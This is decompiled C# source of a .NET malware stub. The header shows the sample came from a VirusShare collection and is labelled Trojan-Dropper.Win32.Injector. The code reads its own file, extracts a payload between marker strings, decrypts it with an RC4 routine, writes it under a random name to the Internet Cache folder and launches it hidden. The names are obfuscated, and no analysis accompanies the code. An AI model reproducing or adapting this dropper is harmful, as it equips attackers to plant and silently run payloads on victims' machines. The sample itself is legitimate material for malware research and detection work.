// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=2.0.0.0, Culture=neutral, PublicKeyToken=e82741a1e7f982b8
// MVID: 3BD29B7B-5571-4CF4-B9E3-DCB4E9BB01AD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Injector.mfbp-ad5674e08572f4aad35704b879485383c67325fa0eee594f83fbd15db88336f8.exe

using \u0001;
using \u0007;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0007
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    [STAThread]
    public static void \u0003()
    {
      string str1;
      int[] numArray;
      string str2;
      string str3;
      int num1;
      string str4;
      string str5;
      string str6;
      string str7;
      bool flag;
      try
      {
        if (!\u0006.\u0003.\u0004())
          return;
        flag = true;
        \u0010\u0005.\u0011(1, \u008A\u0003.\u008D\u0006(), OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
        str1 = \u0091\u0005.\u001F(checked ((int) \u009B\u0002.\u0015(1)));
        \u0005\u0004.\u0013(1, ref str1, -1L, false);
        numArray = new int[1]{ 1 };
        \u0008\u0005.\u0012(numArray);
        ref string local1 = ref str1;
        str2 = \u0002.\u0001(6175);
        ref string local2 = ref str2;
        str3 = \u0002.\u0001(6192);
        ref string local3 = ref str3;
        num1 = 0;
        ref int local4 = ref num1;
        str4 = \u0002.\u0003(ref local1, ref local2, ref local3, ref local4);
        ref string local5 = ref str1;
        str3 = \u0002.\u0001(6213);
        ref string local6 = ref str3;
        str2 = \u0002.\u0001(6230);
        ref string local7 = ref str2;
        num1 = 0;
        ref int local8 = ref num1;
        str5 = \u0002.\u0003(ref local5, ref local6, ref local7, ref local8);
        str6 = \u0002.\u0003(str4, str5);
        str7 = \u0084\u0004.\u0084\u0002(\u0088\u0003.\u001E\u0003(Environment.SpecialFolder.InternetCache), \u0002.\u0001(2849), \u0091\u0005.\u0016(\u0002.\u0003(1, 9)), \u0002.\u0001(6247));
        if (\u0017\u0003.\u007E\u001C((object) \u0082\u0003.\u007E\u000F((object) \u0007.\u0001.\u0003()), str7))
          \u008C\u0003.\u0010(str7);
        \u0010\u0005.\u0011(1, str7, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
        \u000F\u0005.\u0014(1, str6, -1L, false);
        numArray = new int[1]{ 1 };
        \u0008\u0005.\u0012(numArray);
        int num2 = \u0096\u0003.\u001B(str7, AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        object[] objArray = new object[10]
        {
          (object) flag,
          (object) str1,
          (object) str7,
          (object) str6,
          (object) str5,
          (object) str4,
          (object) numArray,
          (object) str2,
          (object) str3,
          (object) num1
        };
        \u0003.\u0006.\u0003(ex, objArray);
      }
    }

    private static string \u0003(
      [In] ref string obj0,
      [In] ref string obj1,
      [In] ref string obj2,
      ref int PAUDhaA = 0)
    {
      int num1;
      int num2;
      int num3;
      string str1;
      try
      {
        num2 = \u0011\u0005.\u007E\u0012\u0002((object) obj1);
        str1 = string.Empty;
        num1 = \u0092\u0003.\u007E\u0019\u0002((object) obj0, obj1, PAUDhaA);
        num3 = \u0092\u0003.\u007E\u0019\u0002((object) obj0, obj2, checked (num1 + num2));
        if (num1 != -1 && num3 != -1)
          str1 = \u0081\u0004.\u007E\u0015\u0002((object) obj0, checked (num1 + num2), checked (num3 - num1 + num2));
        return str1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        string str2;
        string str3 = str2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num3;
        string str4 = str1;
        string str5 = obj0;
        string str6 = obj1;
        string str7 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) PAUDhaA;
        throw UnhandledException.\u0003(ex, (object) local1, (object) local2, (object) str3, (object) local3, (object) str4, (object) str5, (object) str6, (object) str7, (object) local4);
      }
    }

    private static int \u0003([In] int obj0, [In] int obj1)
    {
      int num1;
      int num2;
      Random random1;
      int num3;
      try
      {
        try
        {
          ProjectData.ClearProjectError();
          num2 = 2;
          random1 = new Random();
          num3 = random1.Next(obj0, obj1);
          goto label_6;
label_2:
          num1 = -1;
          switch (num2)
          {
            case 2:
              ProjectData.EndApp();
              goto label_6;
          }
        }
        catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_2;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_6:
        int num4 = num3;
        if (num1 != 0)
          ProjectData.ClearProjectError();
        return num4;
      }
      catch (Exception ex)
      {
        Random random2 = random1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj1;
        throw UnhandledException.\u0003(ex, (object) random2, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5);
      }
    }

    private static string \u0003([In] string obj0, [In] string obj1)
    {
      int num1;
      int index1;
      char ch1;
      int[] numArray1;
      int[] numArray2;
      int index2;
      int index3;
      int num2;
      int num3;
      int index4;
      int index5;
      int num4;
      char ch2;
      int num5;
      StringBuilder stringBuilder1;
      string str1;
      try
      {
        index4 = 0;
        index5 = 0;
        stringBuilder1 = new StringBuilder();
        str1 = string.Empty;
        numArray2 = new int[257];
        numArray1 = new int[257];
        num1 = \u0011\u0005.\u007E\u0012\u0002((object) obj1);
        index1 = 0;
        while (index1 <= (int) byte.MaxValue)
        {
          ch1 = \u009F\u0002.\u007E\u0011\u0002((object) \u0081\u0004.\u007E\u0015\u0002((object) obj1, index1 % num1, 1))[0];
          numArray1[index1] = \u001F\u0003.\u001D(ch1);
          numArray2[index1] = index1;
          int num6 = \u0082\u0005.\u008C\u0003(\u0098\u0004.\u001D\u0004(ref index1), checked (index1 - 1));
        }
        index2 = 0;
        index3 = 0;
        while (index3 <= (int) byte.MaxValue)
        {
          index2 = checked (index2 + numArray2[index3] + numArray1[index3]) % 256;
          num2 = numArray2[index3];
          numArray2[index3] = numArray2[index2];
          numArray2[index2] = num2;
          int num7 = \u0082\u0005.\u008C\u0003(\u0098\u0004.\u001D\u0004(ref index3), checked (index3 - 1));
        }
        index1 = 1;
        while (index1 <= \u0011\u0005.\u007E\u0012\u0002((object) obj0))
        {
          num3 = 0;
          index4 = checked (index4 + 1) % 256;
          index5 = checked (index5 + numArray2[index4]) % 256;
          num3 = numArray2[index4];
          numArray2[index4] = numArray2[index5];
          numArray2[index5] = num3;
          num4 = numArray2[checked (numArray2[index4] + numArray2[index5]) % 256];
          ch2 = \u009F\u0002.\u007E\u0011\u0002((object) \u0081\u0004.\u007E\u0015\u0002((object) obj0, checked (index1 - 1), 1))[0];
          num3 = \u001F\u0003.\u001D(ch2);
          num5 = num3 ^ num4;
          StringBuilder stringBuilder2 = \u008E\u0002.\u007E\u008B\u0002((object) stringBuilder1, \u001A\u0004.\u001E(num5));
          int num8 = \u0082\u0005.\u008C\u0003(\u0098\u0004.\u001D\u0004(ref index1), checked (index1 - 1));
        }
        str1 = \u008E\u0005.\u007E\u0088\u0002((object) stringBuilder1);
        \u008E\u0003.\u007E\u0089\u0002((object) stringBuilder1, 0);
        return str1;
      }
      catch (Exception ex)
      {
        string str2;
        object[] objArray = new object[19]
        {
          (object) index1,
          (object) index3,
          (object) numArray2,
          (object) index4,
          (object) stringBuilder1,
          (object) index5,
          (object) numArray1,
          (object) str2,
          (object) num1,
          (object) index2,
          (object) str1,
          (object) ch1,
          (object) num2,
          (object) ch2,
          (object) num5,
          (object) num4,
          (object) num3,
          (object) obj0,
          (object) obj1
        };
        throw UnhandledException.\u0003(ex, objArray);
      }
    }

    static \u0002() => \u0001.\u0003.\u0003();
  }
}
